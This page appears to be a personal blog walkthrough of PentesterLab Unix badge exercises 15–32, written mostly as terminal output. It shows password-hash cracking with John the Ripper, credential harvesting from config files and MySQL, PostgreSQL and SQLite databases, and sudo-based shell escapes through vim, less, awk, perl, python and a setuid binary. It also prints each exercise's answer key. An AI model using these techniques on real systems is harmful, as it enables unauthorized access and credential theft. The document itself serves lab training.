<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="Unix badge url: https://pentesterlab.com/badges/unix unix 15 # localhost ~/tmp $ cat password.txt victim:.KZvc9iQNfERE:18049:0:99999:7::: ~/tmp $ john password.txt --format=descrypt Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status victim15 (victim) # Pentesterlab victim@2fb2419a7083:~$ cat key.txt 95729b33-fc12-4833-9ba1-eb89dc86293d unix 16 # localhost ~/tmp $ cat hash.txt victim:$1$Q7ncB6rF$59kaRvdn0x6eUtrR65/NG0:18049:0:99999:7::: ~/tmp $ john hash.txt --format=md5crypt Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 12x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status victim12 (victim) # pentesterlab victim@176d1be0ba89:~$ cat key."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="Unix badge url: https://pentesterlab.com/badges/unix unix 15 # localhost ~/tmp $ cat password.txt victim:.KZvc9iQNfERE:18049:0:99999:7::: ~/tmp $ john password.txt --format=descrypt Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status victim15 (victim) # Pentesterlab victim@2fb2419a7083:~$ cat key.txt 95729b33-fc12-4833-9ba1-eb89dc86293d unix 16 # localhost ~/tmp $ cat hash.txt victim:$1$Q7ncB6rF$59kaRvdn0x6eUtrR65/NG0:18049:0:99999:7::: ~/tmp $ john hash.txt --format=md5crypt Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 12x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status victim12 (victim) # pentesterlab victim@176d1be0ba89:~$ cat key."><meta property="og:title" content><meta property="og:description" content="Unix badge url: https://pentesterlab.com/badges/unix unix 15 # localhost ~/tmp $ cat password.txt victim:.KZvc9iQNfERE:18049:0:99999:7::: ~/tmp $ john password.txt --format=descrypt Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status victim15 (victim) # Pentesterlab victim@2fb2419a7083:~$ cat key.txt 95729b33-fc12-4833-9ba1-eb89dc86293d unix 16 # localhost ~/tmp $ cat hash.txt victim:$1$Q7ncB6rF$59kaRvdn0x6eUtrR65/NG0:18049:0:99999:7::: ~/tmp $ john hash.txt --format=md5crypt Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 12x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status victim12 (victim) # pentesterlab victim@176d1be0ba89:~$ cat key."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/pentesterlabs/02-unix/"><meta property="article:section" content="infosec"><title>Unix badge </title><link rel=canonical href=https://www.darvein.net/infosec/pentesterlabs/02-unix/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=unix-badge>Unix badge
<a class=heading-link href=#unix-badge><i class="fa fa-link" aria-hidden=true></i></a></h1><p>url:
<a href=https://pentesterlab.com/badges/unix>https://pentesterlab.com/badges/unix</a></p><h2 id=unix-15>unix 15
<a class=heading-link href=#unix-15><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># localhost</span>
</span></span><span style=display:flex><span>~/tmp $ cat password.txt
</span></span><span style=display:flex><span>victim:.KZvc9iQNfERE:18049:0:99999:7:::
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~/tmp $ john password.txt --format=descrypt
</span></span><span style=display:flex><span>Loaded <span style=color:#0086f7;font-weight:700>1</span> password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])
</span></span><span style=display:flex><span>Will run <span style=color:#0086f7;font-weight:700>8</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#0086d2>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#fb660a;font-weight:700>for</span> status
</span></span><span style=display:flex><span>victim15         (victim)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Pentesterlab</span>
</span></span><span style=display:flex><span>victim@2fb2419a7083:~$ cat key.txt 
</span></span><span style=display:flex><span>95729b33-fc12-4833-9ba1-eb89dc86293d
</span></span></code></pre></div><h2 id=unix-16>unix 16
<a class=heading-link href=#unix-16><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># localhost</span>
</span></span><span style=display:flex><span>~/tmp $ cat hash.txt
</span></span><span style=display:flex><span>victim:<span style=color:#fb660a>$1$Q7ncB6rF$59</span>kaRvdn0x6eUtrR65/NG0:18049:0:99999:7:::
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~/tmp $ john hash.txt --format=md5crypt
</span></span><span style=display:flex><span>Loaded <span style=color:#0086f7;font-weight:700>1</span> password hash (md5crypt, crypt(3) <span style=color:#fb660a>$1</span>$ [MD5 128/128 AVX 12x])
</span></span><span style=display:flex><span>Will run <span style=color:#0086f7;font-weight:700>8</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#0086d2>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#fb660a;font-weight:700>for</span> status
</span></span><span style=display:flex><span>victim12         (victim)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>victim@176d1be0ba89:~$ cat key.txt 
</span></span><span style=display:flex><span>d12e3ce8-31b1-453e-89a1-d22e63fab457
</span></span></code></pre></div><h2 id=unix-17>unix 17
<a class=heading-link href=#unix-17><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>pentesterlab@cef721be5273:~$ find /etc/ -name tomcat-users.xml
</span></span><span style=display:flex><span>/etc/tomcat7/tomcat-users.xml
</span></span><span style=display:flex><span>pentesterlab@cef721be5273:~$ grep admin /etc/tomcat7/tomcat-users.xml 
</span></span><span style=display:flex><span>  &lt;user <span style=color:#fb660a>username</span>=<span style=color:#0086d2>&#34;admin&#34;</span> <span style=color:#fb660a>password</span>=<span style=color:#0086d2>&#34;b1f6d0b4-aba8-4741-8a98-35e48df8d4d1&#34;</span> <span style=color:#fb660a>roles</span>=<span style=color:#0086d2>&#34;tomcat,admin&#34;</span>/&gt;
</span></span></code></pre></div><h2 id=unix-18>unix 18
<a class=heading-link href=#unix-18><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>pentesterlab@5b0305b39588:~$ mysql -u root
</span></span><span style=display:flex><span>mysql&gt; show databases;
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| Database           |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| information_schema |
</span></span><span style=display:flex><span>| mysql              |
</span></span><span style=display:flex><span>| pentesterlab       |
</span></span><span style=display:flex><span>| performance_schema |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>4</span> rows in set (0.00 sec)
</span></span><span style=display:flex><span>mysql&gt; use pentesterlab;
</span></span><span style=display:flex><span>Reading table information <span style=color:#fb660a;font-weight:700>for</span> completion of table and column names
</span></span><span style=display:flex><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style=display:flex><span>Database changed
</span></span><span style=display:flex><span>mysql&gt; show tables;
</span></span><span style=display:flex><span>+------------------------+
</span></span><span style=display:flex><span>| Tables_in_pentesterlab |
</span></span><span style=display:flex><span>+------------------------+
</span></span><span style=display:flex><span>| users                  |
</span></span><span style=display:flex><span>+------------------------+
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>1</span> row in set (0.00 sec)
</span></span><span style=display:flex><span>mysql&gt; <span style=color:#fb660a;font-weight:700>select</span> * from users;
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span>| login | password                             |
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span>| admin | 0cefcff1-b087-4710-95ee-92218b028cdf |
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>1</span> row in set (0.00 sec)
</span></span><span style=display:flex><span>mysql&gt; 
</span></span></code></pre></div><h2 id=unix-19>unix 19
<a class=heading-link href=#unix-19><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Same ex like before, the pass is an anagram of `root`</span>
</span></span><span style=display:flex><span>mysql&gt; <span style=color:#fb660a;font-weight:700>select</span> * from logins;
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span>| login | password                             |
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span>| admin | 341d9c64-87ef-4a7b-a316-148be4644f61 |
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>1</span> row in set (0.00 sec)&lt;Paste&gt;
</span></span></code></pre></div><h2 id=unix-20>unix 20
<a class=heading-link href=#unix-20><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>mysql@8d447bd246a3:/var/lib/mysql/mysql$ strings /var/lib/mysql/mysql/user.MYD
</span></span><span style=display:flex><span>        localhost
</span></span><span style=display:flex><span>root*6C5083122F877455EF5E7B01
</span></span><span style=display:flex><span>6c732c6044b7
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>        127.0.0.1
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>        localhost
</span></span><span style=display:flex><span>debian-sys-maint*D1461CE757B9B67AC344204A3A7FE9F9DB17A35C
</span></span><span style=display:flex><span>65C9098F15F0D511
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># localhost</span>
</span></span><span style=display:flex><span>~/tmp $ john --help | grep sql
</span></span><span style=display:flex><span>                          mssql mssql05 mssql12 mysql mysql-sha1
</span></span><span style=display:flex><span>                          mysql-sha1-opencl mysqlna net-md5 net-sha1 nethalflm
</span></span><span style=display:flex><span>~/tmp $ john hash.txt --format=mysql-sha1 --show
</span></span><span style=display:flex><span>root:root1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>mysql&gt; <span style=color:#fb660a;font-weight:700>select</span> * from users;
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span>| login | password                             |
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span>| admin | 4a8205c8-cad8-4cc8-97e5-ed3be8ff204b |
</span></span><span style=display:flex><span>+-------+--------------------------------------+
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>1</span> row in set (0.00 sec)
</span></span></code></pre></div><h2 id=unix-21>unix 21
<a class=heading-link href=#unix-21><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>mysql&gt; <span style=color:#fb660a;font-weight:700>select</span> load_file(<span style=color:#0086d2>&#34;/var/lib/mysql-files/key.txt&#34;</span>);
</span></span><span style=display:flex><span>+-------------------------------------------+
</span></span><span style=display:flex><span>| load_file(<span style=color:#0086d2>&#34;/var/lib/mysql-files/key.txt&#34;</span>) |
</span></span><span style=display:flex><span>+-------------------------------------------+
</span></span><span style=display:flex><span>| 4234db90-01c6-4f10-8c81-8c0017107fc7
</span></span><span style=display:flex><span>     |
</span></span><span style=display:flex><span>     +-------------------------------------------+
</span></span><span style=display:flex><span>     <span style=color:#0086f7;font-weight:700>1</span> row in set (0.00 sec)
</span></span><span style=display:flex><span>     mysql&gt; 
</span></span></code></pre></div><h2 id=unix-22>unix 22
<a class=heading-link href=#unix-22><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>postgres</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># \list</span>
</span></span><span style=display:flex><span>                               List of databases
</span></span><span style=display:flex><span>     Name     |  Owner   | Encoding  | Collate | Ctype |   Access privileges   
</span></span><span style=display:flex><span>--------------+----------+-----------+---------+-------+-----------------------
</span></span><span style=display:flex><span> pentesterlab | postgres | SQL_ASCII | C       | C     | 
</span></span><span style=display:flex><span> postgres     | postgres | SQL_ASCII | C       | C     | 
</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>4</span> rows)
</span></span><span style=display:flex><span><span style=color:#fb660a>postgres</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># \c pentesterlab</span>
</span></span><span style=display:flex><span>You are now connected to database <span style=color:#0086d2>&#34;pentesterlab&#34;</span> as user <span style=color:#0086d2>&#34;postgres&#34;</span>.
</span></span><span style=display:flex><span><span style=color:#fb660a>pentesterlab</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># \d</span>
</span></span><span style=display:flex><span>         List of relations
</span></span><span style=display:flex><span> Schema | Name  | Type  |  Owner   
</span></span><span style=display:flex><span>--------+-------+-------+----------
</span></span><span style=display:flex><span> public | users | table | postgres
</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>1</span> row)
</span></span><span style=display:flex><span><span style=color:#fb660a>pentesterlab</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># select * from users;</span>
</span></span><span style=display:flex><span> login |               password               
</span></span><span style=display:flex><span>-------+--------------------------------------
</span></span><span style=display:flex><span> admin | c3a2fb1c-c0d9-418b-9e36-ed098ff6ee4b
</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>1</span> row)
</span></span></code></pre></div><h2 id=unix-23>unix 23
<a class=heading-link href=#unix-23><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>pentesterlab@bb0af924810e:~$ grep  -Ri  password /var/www/* | grep photoblog
</span></span><span style=display:flex><span>/var/www/classes/db.php:    <span style=color:#fb660a>$lnk</span> = pg_connect(<span style=color:#0086d2>&#34;host=localhost port=5432 dbname=photoblog user=photoblog password=photoblog&#34;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@bb0af924810e:~$ psql -U photoblog 
</span></span><span style=display:flex><span>Password <span style=color:#fb660a;font-weight:700>for</span> user photoblog: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>photoblog</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># \list</span>
</span></span><span style=display:flex><span>                              List of databases
</span></span><span style=display:flex><span>   Name    |  Owner   | Encoding  | Collate | Ctype |   Access privileges    
</span></span><span style=display:flex><span>-----------+----------+-----------+---------+-------+------------------------
</span></span><span style=display:flex><span> photoblog | postgres | SQL_ASCII | C       | C     | =Tc/postgres          +
</span></span><span style=display:flex><span>           |          |           |         |       | <span style=color:#fb660a>postgres</span>=CTc/postgres +
</span></span><span style=display:flex><span>           |          |           |         |       | <span style=color:#fb660a>photoblog</span>=CTc/postgres
</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>4</span> rows)
</span></span><span style=display:flex><span><span style=color:#fb660a>photoblog</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># \c photoblog</span>
</span></span><span style=display:flex><span>You are now connected to database <span style=color:#0086d2>&#34;photoblog&#34;</span> as user <span style=color:#0086d2>&#34;photoblog&#34;</span>.
</span></span><span style=display:flex><span><span style=color:#fb660a>photoblog</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># create table demo9(t text);</span>
</span></span><span style=display:flex><span>CREATE TABLE
</span></span><span style=display:flex><span><span style=color:#fb660a>photoblog</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># copy demo9 from &#39;/var/lib/postgresql/9.4/key.txt&#39;;</span>
</span></span><span style=display:flex><span>COPY <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>photoblog</span>=<span style=color:#080;background-color:#0f140f;font-style:italic># select * from demo9;</span>
</span></span><span style=display:flex><span>                  t                   
</span></span><span style=display:flex><span>--------------------------------------
</span></span><span style=display:flex><span> 25eb9d43-416e-4d3e-9dd3-a7a707380bdb
</span></span><span style=display:flex><span>(<span style=color:#0086f7;font-weight:700>1</span> row)
</span></span></code></pre></div><h2 id=unix-24>unix 24
<a class=heading-link href=#unix-24><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>pentesterlab@51959c9472e4:~$ sqlite3 /tmp/database.db 
</span></span><span style=display:flex><span>sqlite&gt; .tables
</span></span><span style=display:flex><span>users
</span></span><span style=display:flex><span>sqlite&gt; <span style=color:#fb660a;font-weight:700>select</span> * from users;
</span></span><span style=display:flex><span>admin|3af54a55-f26d-409a-a7b3-aa14a4b3303c
</span></span></code></pre></div><h2 id=unix-25>unix 25
<a class=heading-link href=#unix-25><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>pentesterlab@a18ca1c5f6cd:~$ sudo -l
</span></span><span style=display:flex><span>    (victim) /bin/bash
</span></span><span style=display:flex><span>pentesterlab@a18ca1c5f6cd:~$ sudo -u victim /bin/bash
</span></span><span style=display:flex><span>victim@a18ca1c5f6cd:/home/pentesterlab$ ls ~/
</span></span><span style=display:flex><span>key.txt
</span></span><span style=display:flex><span>victim@a18ca1c5f6cd:/home/pentesterlab$ cat ~/key.txt 
</span></span><span style=display:flex><span>b4842d63-c71c-4694-9b30-3b20aae22807
</span></span></code></pre></div><h2 id=unix-26>unix 26
<a class=heading-link href=#unix-26><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>pentesterlab@6d162d7c67a9:~$ sudo -l
</span></span><span style=display:flex><span>User pentesterlab may run the following commands on 6d162d7c67a9:
</span></span><span style=display:flex><span>    (victim) /usr/bin/find
</span></span><span style=display:flex><span>pentesterlab@6d162d7c67a9:~$ sudo -u victim /usr/bin/find /home/victim -name key.txt -exec cat {} <span style=color:#0086d2>\;</span>
</span></span><span style=display:flex><span>0d27fcdb-c2b9-4a79-8faa-c470cbea2fe8
</span></span></code></pre></div><h2 id=unix-27>unix 27
<a class=heading-link href=#unix-27><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># via sudo it can be seen that `victim` can run vim</span>
</span></span><span style=display:flex><span>26f56b7b-b751-4cdd-8210-c2298b2c0f27
</span></span></code></pre></div><h2 id=unix-28>unix 28
<a class=heading-link href=#unix-28><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># victim can run `/usr/bin/less` via sudo. So vim/less can open shells:</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># vim: `:shell`</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># less: `!/bin/bash`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ebd6927d-8097-46c0-98c9-ccd0049c30ab
</span></span></code></pre></div><h2 id=unix-29>unix 29
<a class=heading-link href=#unix-29><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Gaining shell via `awk`:</span>
</span></span><span style=display:flex><span>awk <span style=color:#0086d2>&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@bed7bccc926b:~$ sudo -u victim /usr/bin/awk <span style=color:#0086d2>&#39;BEGIN{system(&#34;/bin/bash&#34;)}&#39;</span>
</span></span><span style=display:flex><span>victim@bed7bccc926b:/home/pentesterlab$ cat ~/key.txt 
</span></span><span style=display:flex><span>847fb3ee-877f-46b3-82a7-9deb4234ff96
</span></span></code></pre></div><h2 id=unix-30>unix 30
<a class=heading-link href=#unix-30><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>pentesterlab@effb26db2333:~$ sudo -l
</span></span><span style=display:flex><span>User pentesterlab may run the following commands on effb26db2333:
</span></span><span style=display:flex><span>    (victim) /bin/chmod, /bin/cp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@effb26db2333:/tmp/ba$ cat copy.c 
</span></span><span style=display:flex><span>int main(){
</span></span><span style=display:flex><span>system(<span style=color:#0086d2>&#34;cat /home/victim/key.txt&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@effb26db2333:/tmp/ba$ gcc -o copy copy.c
</span></span><span style=display:flex><span>pentesterlab@effb26db2333:/tmp/ba$ sudo -u victim /bin/cp copy /tmp/copy
</span></span><span style=display:flex><span>pentesterlab@effb26db2333:/tmp/ba$ sudo -u victim /bin/chmod +xs /tmp/copy
</span></span><span style=display:flex><span>pentesterlab@effb26db2333:/tmp/ba$ /tmp/copy
</span></span><span style=display:flex><span>1340b7d2-76ce-49c0-9343-11cdf223b572
</span></span></code></pre></div><h2 id=unix-31>unix 31
<a class=heading-link href=#unix-31><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># spawn a shell in perl</span>
</span></span><span style=display:flex><span>perl —e <span style=color:#0086d2>&#39;exec &#34;/bin/sh&#34;;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@c46c78e0463e:~$ sudo -l
</span></span><span style=display:flex><span>    (victim) /usr/bin/perl
</span></span><span style=display:flex><span>pentesterlab@c46c78e0463e:~$ sudo -u victim /usr/bin/perl -e <span style=color:#0086d2>&#39;exec &#34;/bin/bash&#34;&#39;</span>
</span></span><span style=display:flex><span>victim@c46c78e0463e:/home/pentesterlab$ cat ~/key.txt
</span></span><span style=display:flex><span>19675da1-a2bf-4c7c-92e0-1202cf6e3f5c
</span></span></code></pre></div><h2 id=unix-32>unix 32
<a class=heading-link href=#unix-32><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># spawn a shell in python</span>
</span></span><span style=display:flex><span>python -c <span style=color:#0086d2>&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@3f77e6a1a926:~$ sudo -l
</span></span><span style=display:flex><span>    (victim) /usr/bin/python
</span></span><span style=display:flex><span>pentesterlab@3f77e6a1a926:~$ sudo -u victim /usr/bin/python -c <span style=color:#0086d2>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>victim@3f77e6a1a926:/home/pentesterlab$ cat ~/key.txt
